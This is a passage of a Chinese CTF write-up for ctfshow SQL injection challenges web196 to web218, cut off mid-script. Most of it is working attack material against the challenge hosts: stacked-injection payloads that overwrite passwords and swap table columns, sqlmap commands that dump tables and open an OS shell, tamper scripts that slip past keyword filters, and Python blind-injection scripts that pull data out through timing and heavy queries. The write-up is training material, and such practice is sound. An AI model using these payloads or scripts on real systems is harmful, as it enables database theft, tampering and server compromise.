$ret[\u0026#39;msg\u0026#39;]=\u0026#34;登陆成功 flag is $flag\u0026#34;; 27 } 根据提示堆叠注入\n其实就是在;后面再执行任意的sql命令\n这里直接改密码\npayload=\u0026#34;0x61646d696e;update`ctfshow_user`set`pass`=0x313131;\u0026#34;\r# 至于为什么非得用十六进制登录，是因为下面这个没有字符串单引号包围\rsql = \u0026#34;select pass from ctfshow_user where username = {$username};\u0026#34;;\r# @Author:Y4tacker admin \u0026lt;=\u0026gt; 0x61646d696e\r111\u0026lt;=\u0026gt;0x313131 web196 查询语句\r//拼接sql语句查找指定ID用户\r$sql = \u0026#34;select pass from ctfshow_user where username = {$username};\u0026#34;;\r返回逻辑\r//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧\rif(preg_match(\u0026#39;/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|\\\u0026#39;|\\\u0026#34;|select|union|or|and|\\x26|\\x7c|file|into/i\u0026#39;, $username)){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;;\rdie(json_encode($ret));\r}\rif(strlen($username)\u0026gt;16){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名不能超过16个字符\u0026#39;;\rdie(json_encode($ret));\r}\rif($row[0]==$password){\r$ret[\u0026#39;msg\u0026#39;]=\u0026#34;登陆成功 flag is $flag\u0026#34;;\r}\r这题应该是bug了，select没被waf\n在 PHP 里，当使用数据库查询语句从数据库中获取结果集时，通常会逐行遍历结果集。每一行数据可以用一个数组来表示，$row[0] 指的是这一行数组中的第一个元素。\npayload:\n0;select(2)\r2 web197 1查询语句 2 3 //拼接sql语句查找指定ID用户 4 $sql = \u0026#34;select pass from ctfshow_user where username = {$username};\u0026#34;; 5 6返回逻辑 7 8 9 //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧 10 if(\u0026#39;/\\*|\\#|\\-|\\x23|\\\u0026#39;|\\\u0026#34;|union|or|and|\\x26|\\x7c|file|into|select|update|set//i\u0026#39;, $username)){ 11 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;用户名非法\u0026#39;; 12 die(json_encode($ret)); 13 } 14 15 if($row[0]==$password){ 16 $ret[\u0026#39;msg\u0026#39;]=\u0026#34;登陆成功 flag is $flag\u0026#34;; 17 } 18 这把不能用select，那我们只需要想办法给$row[0]一个确定的值即可\n比如\nusername: 1;show tables password: ctfshow_user 其他的一些骚操作\n重写ctfshow_user表\n把密码和id列互换之后爆密码（实际上在爆id）\n1# @Author:Y4tacker 2import requests 3 4url = \u0026#34;http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/\u0026#34; 5for i in range(100): 6 if i == 0: 7 data = { 8 \u0026#39;username\u0026#39;: \u0026#39;0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user \u0026#39; 9 \u0026#39;change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` \u0026#39; 10 \u0026#39;varchar(255);\u0026#39;, 11 \u0026#39;password\u0026#39;: f\u0026#39;{i}\u0026#39; 12 } 13 r = requests.post(url, data=data) 14 data = { 15 \u0026#39;username\u0026#39;: \u0026#39;0x61646d696e\u0026#39;, 16 \u0026#39;password\u0026#39;: f\u0026#39;{i}\u0026#39; 17 } 18 r = requests.post(url, data=data) 19 if \u0026#34;登陆成功\u0026#34; in r.json()[\u0026#39;msg\u0026#39;]: 20 print(r.json()[\u0026#39;msg\u0026#39;]) 21 break web198 同web197\nweb199 通解一把梭\nweb200 通解一把梭\nweb190-web200通解 username=0;show tables;\rpass=ctfshow_user sqlmap的使用 web201 sqlmap最新版下载\r使用--user-agent 指定agent\r使用--referer 绕过referer检查 检测注入类型\rpython sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/sqlmap.php/api/?id= --user-agent sqlmap --referer ctf.show\r爆数据库\rpython sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show --dbs\r爆表\rpython sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D ctfshow_web --tables 爆列\rpython sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --columns\r爆值\rpython sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --dump web202 sqlmap最新版下载\r使用--data 调整sqlmap的请求方式 //拼接sql语句查找指定ID用户\r$sql = \u0026#34;select id,username,password from ctfshow_user where username !=\u0026#39;flag\u0026#39; and id = \u0026#39;\u0026#34;.$_GET[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39;;\u0026#34;;\r返回逻辑\r//对传入的参数进行了过滤\rfunction waf($str){\r//代码过于简单，不宜展示\r} 通过向命令行加入\u0026ndash;data参数转化请求方式为post\nsqlmap -u http://e39cef84-16aa-4167-b5d8-2609318ff7cc.challenge.ctf.show/api/ --data \u0026#39;id=1\u0026#39; --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --dump web203 sqlmap最新版下载\r使用--method 调整sqlmap的请求方式 查询语句\r//拼接sql语句查找指定ID用户\r$sql = \u0026#34;select id,username,password from ctfshow_user where username !=\u0026#39;flag\u0026#39; and id = \u0026#39;\u0026#34;.$_GET[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39;;\u0026#34;;\r返回逻辑\r//对传入的参数进行了过滤\rfunction waf($str){\r//代码过于简单，不宜展示\r} \u0026ndash;headers=\u0026ldquo;Content-Type: text/plain\u0026rdquo; 以表单形式发送\nsqlmap -u \u0026#34;http://29e626b4-75fb-4058-98af-126d2bf725c5.challenge.ctf.show/api/index.php\u0026#34; --method=\u0026#34;PUT\u0026#34; --data=\u0026#34;id=1\u0026#34; --referer=ctf.show --headers=\u0026#34;Content-Type: text/plain\u0026#34; -D ctfshow_web -T ctfshow_user -C pass --dump web204 使用--cookie 提交cookie数据 payload:\nsqlmap -u \u0026#34;http://c07422b1-5bde-4baa-9e8c-73ef4edfa83a.challenge.ctf.show/api/index.php\u0026#34; --method=\u0026#34;PUT\u0026#34; --data=\u0026#34;id=1\u0026#34; --referer=ctf.show --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID:eqf4q2s5ma4u4vtj31sf25lbp5;ctfshow:d5d0917\r6f63d87074e926a342a996872\u0026#34; -D ctfshow_web -T ctfshow_user -C pass --dump web205 api调用需要鉴权 通过抓包分析，在每次请求url/api/index.php之前需要先请求URL/api/getTokn.php\npayload：\nsqlmap -u \u0026#34;http://24e98b18-4f9a-4a11-a265-5022e0e3fb05.challenge.ctf.show/api/index.php\u0026#34; --method=\u0026#34;PUT\u0026#34; --data=\u0026#34;id=1\u0026#34; --referer=ctf.show --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=60prkqe8189934t5pv3ikepa16\u0026#34; --safe-url=\u0026#34;http://24e98b18-4f9a-4a11-a265-5022e0e3fb05.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 -D ctfshow_web -T ctfshow_flax --dump web206 sql需要闭合 //拼接sql语句查找指定ID用户\r$sql = \u0026#34;select id,username,pass from ctfshow_user where id = (\u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39;) limit 0,1;\u0026#34;;\rsqlmap会自动构造闭合，所以跟前一题没什么区别\n但是也可以手动构造一下\npayload:\n根据sql语句，我们采用“)#”的方式进行右闭合。----suffix=\u0026#34;)#\u0026#34;\r执行sqlmap命令行\rsqlmap -u \u0026#34;http://aae90b40-e094-482a-bbe1-eabb586a4291.challenge.ctf.show/api/index.php\u0026#34; --data \u0026#34;id=1\u0026#34; --user-agent=sqlmap --referer=ctf.show --method=put --headers=\u0026#34;Content-Type:text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=sie3k7c33euvbk2s2753f6n0j0;\u0026#34; --safe-url=\u0026#34;https://aae90b40-e094-482a-bbe1-eabb586a4291.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --suffix=\u0026#34;)#\u0026#34; --dbs\rsqlmap -u \u0026#34;http://00b4cc54-fdc1-4b6a-ada7-bc509824917a.challenge.ctf.show/api/index.php\u0026#34; --data \u0026#34;id=1\u0026#34; --user-agent=sqlmap --referer=ctf.show --method=put --headers=\u0026#34;Content-Type:text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=lb4lslploh7thdl0hdsd1008f9;\u0026#34; --safe-url=\u0026#34;https://00b4cc54-fdc1-4b6a-ada7-bc509824917a.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --suffix=\u0026#34;)#\u0026#34; -D ctfshow_web --tables\rsqlmap -u http://52acc440-2ed1-4b93-b3af-171d78632ae7.challenge.ctf.show/api/index.php --method=PUT --data=\u0026#34;id=1\u0026#34; --referer=ctf.show --dbms=mysql -D \u0026#34;ctfshow_web\u0026#34; -T \u0026#34;ctfshow_flaxc\u0026#34; -C \u0026#34;flagv\u0026#34; --dump --headers=\u0026#34;Content-Type: text/plain\u0026#34; --safe-url=http://52acc440-2ed1-4b93-b3af-171d78632ae7.challenge.ctf.show/api/getToken.php --safe-freq=1 web207 Sqlmap Tamper 编写\n示例\n1#!/usr/bin/env python 2 3\u0026#34;\u0026#34;\u0026#34; 4Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/) 5See the file \u0026#39;doc/COPYING\u0026#39; for copying permission 6\u0026#34;\u0026#34;\u0026#34; 7 8from lib.core.enums import PRIORITY 9__priority__ = PRIORITY.LOW # 当前脚本调用优先等级 10 11def dependencies(): # 声明当前脚本适用/不适用的范围，可以为空。 12 pass 13 14def tamper(payload, **kwargs): # 用于篡改Payload、以及请求头的主要函数 15 return payload 题目\n查询语句\r//拼接sql语句查找指定ID用户\r$sql = \u0026#34;select id,username,pass from ctfshow_user where id = (\u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39;) limit 0,1;\u0026#34;;\r返回逻辑\r//对传入的参数进行了过滤\rfunction waf($str){\rreturn preg_match(\u0026#39;/ /\u0026#39;, $str);\r} 这里会将waf中的关键词替换成空格\n放一个Y4tacker大佬的脚本\n1#!/usr/bin/env python 2\u0026#34;\u0026#34;\u0026#34; 3Author:Y4tacker 4\u0026#34;\u0026#34;\u0026#34; 5 6# 假设在Python 3环境中运行，将xrange替换为range 7# 从lib.core.enums模块中导入PRIORITY枚举类型 8from lib.core.enums import PRIORITY 9 10# 设置脚本的优先级为低 11__priority__ = PRIORITY.LOW 12 13def tamper(payload, **kwargs): 14 \u0026#34;\u0026#34;\u0026#34; 15 篡改函数，调用space2comment函数对有效负载进行处理 16 :param payload: 待处理的有效负载 17 :param kwargs: 其他关键字参数 18 :return: 处理后的有效负载 19 \u0026#34;\u0026#34;\u0026#34; 20 payload = space2comment(payload) 21 return payload 22 23def space2comment(payload): 24 \u0026#34;\u0026#34;\u0026#34; 25 将有效负载中的空格字符替换为换行符 26 :param payload: 待处理的有效负载 27 :return: 处理后的有效负载 28 \u0026#34;\u0026#34;\u0026#34; 29 retVal = payload 30 if payload: 31 retVal = \u0026#34;\u0026#34; 32 # 用于跟踪是否在单引号内 33 quote = False 34 # 用于跟踪是否在双引号内 35 doublequote = False 36 # 用于跟踪是否遇到第一个空格 37 firstspace = False 38 39 for i in range(len(payload)): 40 if not firstspace: 41 if payload[i].isspace(): 42 firstspace = True 43 retVal += chr(0x0a) 44 continue 45 46 elif payload[i] == \u0026#39;\\\u0026#39;\u0026#39;: 47 # 取反quote的值 48 quote = not quote 49 50 elif payload[i] == \u0026#39;\u0026#34;\u0026#39;: 51 # 取反doublequote的值 52 doublequote = not doublequote 53 54 elif payload[i] == \u0026#34; \u0026#34; and not doublequote and not quote: 55 retVal += chr(0x0a) 56 continue 57 58 retVal += payload[i] 59 60 return retVal 其实这段代码的目的就是将payload中的空格替换成换行符\n其实直接用sqlmap自带的sapce2comment模板\nsqlmap -u \u0026#34;http://7bf5dfc3-3078-441f-b245-64dab6933839.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=btkhe9vojj5a7piadlc51ubifk;\u0026#34; --referer=ctf.show -D ctfshow_web --safe-url=\u0026#34;http://7bf5dfc3-3078-441f-b245-64dab6933839.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=space2comment -T ctfshow_flaxca --dump web208 同上一题\nsqlmap -u \u0026#34;http://f287c31a-5cae-478d-af39-de7010c92def.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=3e08elobpci83dm5l8mn4hd18k;\u0026#34; --referer=ctf.show -D ctfshow_web --safe-url=\u0026#34;http://f287c31a-5cae-478d-af39-de7010c92def.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=space2comment -T ctfshow_flaxcac --dump web209 这题新增了点waf\n查询语句\r//拼接sql语句查找指定ID用户\r$sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 0,1;\u0026#34;;\r返回逻辑\r//对传入的参数进行了过滤\rfunction waf($str){\r//TODO 未完工\rreturn preg_match(\u0026#39;/ |\\*|\\=/\u0026#39;, $str);\r} Y4tacker大佬的tamper\n1#!/usr/bin/env python 2\u0026#34;\u0026#34;\u0026#34; 3Author:Y4tacker 4\u0026#34;\u0026#34;\u0026#34; 5 6from lib.core.compat import xrange 7from lib.core.enums import PRIORITY 8 9__priority__ = PRIORITY.LOW 10 11 12def tamper(payload, **kwargs): 13 payload = space2comment(payload) 14 return payload 15 16 17def space2comment(payload): 18 retVal = payload 19 if payload: 20 retVal = \u0026#34;\u0026#34; 21 quote, doublequote, firstspace = False, False, False 22 23 for i in xrange(len(payload)): 24 if not firstspace: 25 if payload[i].isspace(): 26 firstspace = True 27 retVal += chr(0x0a) 28 continue 29 30 elif payload[i] == \u0026#39;\\\u0026#39;\u0026#39;: 31 quote = not quote 32 33 elif payload[i] == \u0026#39;\u0026#34;\u0026#39;: 34 doublequote = not doublequote 35 36 elif payload[i] == \u0026#34;*\u0026#34;: 37 retVal += chr(0x31) 38 continue 39 40 elif payload[i] == \u0026#34;=\u0026#34;: 41 retVal += chr(0x0a)+\u0026#39;like\u0026#39;+chr(0x0a) 42 continue 43 44 elif payload[i] == \u0026#34; \u0026#34; and not doublequote and not quote: 45 retVal += chr(0x0a) 46 continue 47 48 retVal += payload[i] 49 50 return retVal 其实也不用写这么复杂\n直接这样也ok的\n1#!/usr/bin/env python 2 3from lib.core.enums import PRIORITY 4 5__priority__ = PRIORITY.NORMAL 6 7def dependencies(): 8 pass 9 10 11def tamper(payload, **kwargs): 12 return payload.replace(\u0026#34;=\u0026#34;, \u0026#34; like \u0026#34;).replace(\u0026#34; \u0026#34;, chr(0x09)) payload:\npython sqlmap.py -u \u0026#34;http://aaa64ad5-5bc1-470b-b485-0549641a1327.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=3oemcboib377tes0fi7ltgh9ba;\u0026#34; --referer=ctf.show -D ctfshow_web --safe-url=\u0026#34;http://aaa64ad5-5bc1-470b-b485-0549641a1327.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=web209 -T ctfshow_flav --dump web210 查询语句\r//拼接sql语句查找指定ID用户\r$sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 0,1;\u0026#34;;\r返回逻辑\r//对查询字符进行解密\rfunction decode($id){\rreturn strrev(base64_decode(strrev(base64_decode($id))));\r}\r这题会对查询的字符进行两次的base64解密和两次的反转\n那我们只需要修改tamper，使传入的payload进行两次base64加密即可\n1#!/usr/bin/env python 2 3from lib.core.enums import PRIORITY 4import base64 5 6__priority__ = PRIORITY.NORMAL 7 8def dependencies(): 9 pass 10 11 12def tamper(payload, **kwargs): 13 rev1 = payload[::-1].encode() 14 encode1 = base64.b64encode(rev1).decode() 15 rev2 = encode1[::-1].encode() 16 encode2 = base64.b64encode(rev2).decode() 17 return encode2 payload:\npython sqlmap.py -u \u0026#34;http://35600981-0e61-43e6-85ce-38d9cc6eeaf5.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=bffum6tr2u1k3h8l9bgtkst4ni;\u0026#34; --referer=ctf.show -D ctfshow_web --safe-url=\u0026#34;http://35600981-0e61-43e6-85ce-38d9cc6eeaf5.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=web210 -T ctfshow_flavi --dump web211 查询语句\r//拼接sql语句查找指定ID用户\r$sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 0,1;\u0026#34;;\r返回逻辑\r//对查询字符进行解密\rfunction decode($id){\rreturn strrev(base64_decode(strrev(base64_decode($id))));\r}\rfunction waf($str){\rreturn preg_match(\u0026#39;/ /\u0026#39;, $str);\r} 增加了空格waf\n问题不大\n1#!/usr/bin/env python 2 3from lib.core.enums import PRIORITY 4import base64 5 6__priority__ = PRIORITY.NORMAL 7 8def dependencies(): 9 pass 10 11 12def tamper(payload, **kwargs): 13\t14 payload0 = payload.replace(\u0026#34; \u0026#34;, chr(0x09)) 15 rev1 = payload0[::-1].encode() 16 encode1 = base64.b64encode(rev1).decode() 17 rev2 = encode1[::-1].encode() 18 encode2 = base64.b64encode(rev2).decode() 19 return encode2 payload\npython sqlmap.py -u \u0026#34;http://f9c9297a-3dc9-496e-8d15-33e170db0df8.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=ibn3o3imhq85l1043f80nbdova;\u0026#34; --referer=ctf.show -D ctfshow_web --safe-url=\u0026#34;http://f9c9297a-3dc9-496e-8d15-33e170db0df8.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=web211 -T ctfshow_flavia --dump web212 1查询语句 2 3//拼接sql语句查找指定ID用户 4$sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 0,1;\u0026#34;; 5 6返回逻辑 7 8//对查询字符进行解密 9 function decode($id){ 10 return strrev(base64_decode(strrev(base64_decode($id)))); 11 } 12function waf($str){ 13 return preg_match(\u0026#39;/ |\\*/\u0026#39;, $str); 14} waf增加了*\n但是不影响上一题的tamper\npython sqlmap.py -u \u0026#34;http://2055229c-7666-493e-9329-2cdc56d820ed.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=72duisds4cprdqlbtf4fu4389d;\u0026#34; --referer=ctf.show -D ctfshow_web --safe-url=\u0026#34;http://2055229c-7666-493e-9329-2cdc56d820ed.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=web211 -T ctfshow_flavis --dump web213 1查询语句 2 3//拼接sql语句查找指定ID用户 4$sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 0,1;\u0026#34;; 5 6返回逻辑 7 8//对查询字符进行解密 9 function decode($id){ 10 return strrev(base64_decode(strrev(base64_decode($id)))); 11 } 12function waf($str){ 13 return preg_match(\u0026#39;/ |\\*/\u0026#39;, $str); 14} 根据提示，用\u0026ndash;os-shell拿到shell读flag\n其他跟上题一样\npayload:\npython sqlmap.py -u \u0026#34;http://341989d1-8945-4c5d-b70e-2d69a0f850b1.challenge.ctf.show/api/index.php\u0026#34; --method=put --data=\u0026#34;id=1\u0026#34; --headers=\u0026#34;Content-Type: text/plain\u0026#34; --cookie=\u0026#34;PHPSESSID=66ddslui3ejn3b4pa6437qm60j;\u0026#34; --referer=ctf.show --safe-url=\u0026#34;http://341989d1-8945-4c5d-b70e-2d69a0f850b1.challenge.ctf.show/api/getToken.php\u0026#34; --safe-freq=1 --tamper=web211 --os-shell 时间盲注 web214 这道题没给出注入点\n主页找到select.js中，测试后发现ip为注入点\n1import requests 2 3url = \u0026#34;http://fe78d582-57da-4291-845f-1e8ff2936104.challenge.ctf.show/api/\u0026#34; 4result = \u0026#34;\u0026#34; 5i = 0 6 7while True: 8 i = i + 1 9 # ASCII码范围，32到127是可打印字符的范围 10 head = 32 11 tail = 127 12 13 while head \u0026lt; tail: 14 # 二分查找的中间值 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16\t# 查表名 17 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 18 # 查列名 19 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_flagx\u0026#39;\u0026#34; 20 # 爆字段 21 payload = \u0026#34;select flaga from ctfshow_flagx\u0026#34; 22 data = { 23 \u0026#39;ip\u0026#39;: f\u0026#34;if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},sleep(1),1)\u0026#34;, 24 \u0026#39;debug\u0026#39;: \u0026#39;0\u0026#39; 25 } 26 try: 27 # 发送POST请求，设置超时时间为1秒 28 r = requests.post(url, data=data, timeout=1) 29 # 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值 30 tail = mid 31 except requests.exceptions.Timeout: 32 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 33 head = mid + 1 34 except Exception as e: 35 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 36 break 37 38 if head != 32: 39 # 如果找到有效的字符，将其添加到结果字符串中 40 result += chr(head) 41 else: 42 # 如果没有找到有效字符，退出循环 43 break 44 print(\u0026#34;[*]Result : \u0026#34;+result) web215 上题脚本改一改\n1import requests 2 3url = \u0026#34;http://08e16d35-1a8c-4ed7-9e9e-760a32aa0756.challenge.ctf.show/api/\u0026#34; 4result = \u0026#34;\u0026#34; 5i = 0 6 7while True: 8 i = i + 1 9 # ASCII码范围，32到127是可打印字符的范围 10 head = 32 11 tail = 127 12 13 while head \u0026lt; tail: 14 # 二分查找的中间值 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16\t# 查表名 17 payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 18 # 查列名 19 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_flagx\u0026#39;\u0026#34; 20 # 爆字段 21 # payload = \u0026#34;select flaga from ctfshow_flagx\u0026#34; 22 data = { 23 \u0026#39;ip\u0026#39;: f\u0026#34;1\u0026#39; or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},sleep(1),1)#\u0026#34;, 24 \u0026#39;debug\u0026#39;: \u0026#39;0\u0026#39; 25 } 26 try: 27 # 发送POST请求，设置超时时间为1秒 28 r = requests.post(url, data=data, timeout=1) 29 # 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值 30 tail = mid 31 except requests.exceptions.Timeout: 32 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 33 head = mid + 1 34 except Exception as e: 35 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 36 break 37 38 if head != 32: 39 # 如果找到有效的字符，将其添加到结果字符串中 40 result += chr(head) 41 else: 42 # 如果没有找到有效字符，退出循环 43 break 44 print(\u0026#34;[*]Result : \u0026#34;+result) web216 构造闭合即可\n1import requests 2 3url = \u0026#34;http://d3d3aa4e-87f5-454c-b589-826971f59bbb.challenge.ctf.show/api/\u0026#34; 4result = \u0026#34;\u0026#34; 5i = 0 6 7while True: 8 i = i + 1 9 # ASCII码范围，32到127是可打印字符的范围 10 head = 32 11 tail = 127 12 13 while head \u0026lt; tail: 14 # 二分查找的中间值 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16\t# 查表名 17 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 18 # 查列名 19 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_flagxcc\u0026#39;\u0026#34; 20 # 爆字段 21 payload = \u0026#34;select flagaac from ctfshow_flagxcc\u0026#34; 22 data = { 23 \u0026#39;ip\u0026#39;: f\u0026#34;\u0026#39;\u0026#39;) or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},sleep(1),1)#\u0026#34;, 24 \u0026#39;debug\u0026#39;: \u0026#39;0\u0026#39; 25 } 26 try: 27 # 发送POST请求，设置超时时间为1秒 28 r = requests.post(url, data=data, timeout=1) 29 # 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值 30 tail = mid 31 except requests.exceptions.Timeout: 32 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 33 head = mid + 1 34 except Exception as e: 35 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 36 break 37 38 if head != 32: 39 # 如果找到有效的字符，将其添加到结果字符串中 40 result += chr(head) 41 else: 42 # 如果没有找到有效字符，退出循环 43 break 44 print(\u0026#34;[*]Result : \u0026#34;+result) web217 这题waf了sleep\n可以改用benchmark\n在 MySQL 中，benchmark函数用于测试表达式执行的性能。它的语法是benchmark(count,expr)，其中count是要执行expr的次数，expr是要测试的表达式。 例如，benchmark(10000000,sha(1))表示将sha(1)这个表达式执行 10000000 次。sha(1)是计算字符串'1'的 SHA - 1 哈希值。 1import requests 2import time 3 4url = \u0026#34;http://b5d4a386-1612-4c40-b14c-e9103a54188c.challenge.ctf.show/api/\u0026#34; 5result = \u0026#34;\u0026#34; 6i = 0 7 8while True: 9 i = i + 1 10 # ASCII码范围，32到127是可打印字符的范围 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 # 二分查找的中间值 16 mid = (head + tail) \u0026gt;\u0026gt; 1 17 # 查数据库 18 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 19 # 查列名字 20 # payload = \u0026#34;select column_name from information_schema.columns where table_name=\u0026#39;ctfshow_flagxccb\u0026#39; limit 1,1\u0026#34; 21 # 查数据 22 payload = \u0026#34;select flagaabc from ctfshow_flagxccb\u0026#34; 23 data = { 24 \u0026#39;ip\u0026#39;: f\u0026#34;1) or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},benchmark(1000000,sha(1)),1)#\u0026#34;, 25 \u0026#39;debug\u0026#39;: \u0026#39;0\u0026#39; 26 } 27 try: 28 # 发送POST请求，设置超时时间为1秒 29 r = requests.post(url, data=data, timeout=0.33) 30 # 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值 31 time.sleep(1) 32 tail = mid 33 except requests.exceptions.Timeout: 34 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 35 time.sleep(1) 36 head = mid + 1 37 except Exception as e: 38 time.sleep(1) 39 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 40 break 41 42 if head != 32: 43 # 如果找到有效的字符，将其添加到结果字符串中 44 result += chr(head) 45 else: 46 # 如果没有找到有效字符，退出循环 47 break 48 49 print(\u0026#34;[*]Result : \u0026#34;+result) benchmark的设置比较苛刻，要多试试\n最好不要设置太大，环境会崩\nweb218 1查询语句 2 3 where id = ($id); 4 5返回逻辑 6 7 //屏蔽危险分子 8 function waf($str){ 9 return preg_match(\u0026#39;/sleep|benchmark/i\u0026#39;,$str); 10 } 11 这题sleep和benchmark都被ban掉了\n可以考虑用笛卡尔积盲注\n参考文章：SQL注入经验-大负荷注入-腾讯云开发者社区-腾讯云\n1import requests 2import time 3 4url = \u0026#34;http://a17ea2c9-7463-4d5a-bfa5-2f6bdcd2daf1.challenge.ctf.show/api/\u0026#34; 5result = \u0026#34;\u0026#34; 6i = 0 7 8while True: 9 i = i + 1 10 # ASCII码范围，32到127是可打印字符的范围 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 # 二分查找的中间值 16 mid = (head + tail) \u0026gt;\u0026gt; 1 17 18 # payload = \u0026#34;select table_name from information_schema.tables where table_schema=database() limit 0,1\u0026#34; 19 # payload = \u0026#34;select column_name from information_schema.columns where table_name=\u0026#39;ctfshow_flagxc\u0026#39; limit 1,1\u0026#34; 20 payload = \u0026#34;select flagaac from ctfshow_flagxc\u0026#34; 21 data = { 22 \u0026#39;ip\u0026#39;: f\u0026#34;1) or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},(select count(*) from information_schema.columns A, information_schema.columns B),1)#\u0026#34;, 23 \u0026#39;debug\u0026#39;: \u0026#39;1\u0026#39; 24 } 25 try: 26 # 发送POST请求，设置超时时间为1秒 27 r = requests.post(url, data=data, timeout=0.15) 28 # 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值 29 time.sleep(0.2) 30 tail = mid 31 except requests.exceptions.Timeout: 32 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 33 time.sleep(0.2) 34 head = mid + 1 35 except Exception as e: 36 time.sleep(0.2) 37 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 38 break 39 40 if head != 32: 41 # 如果找到有效的字符，将其添加到结果字符串中 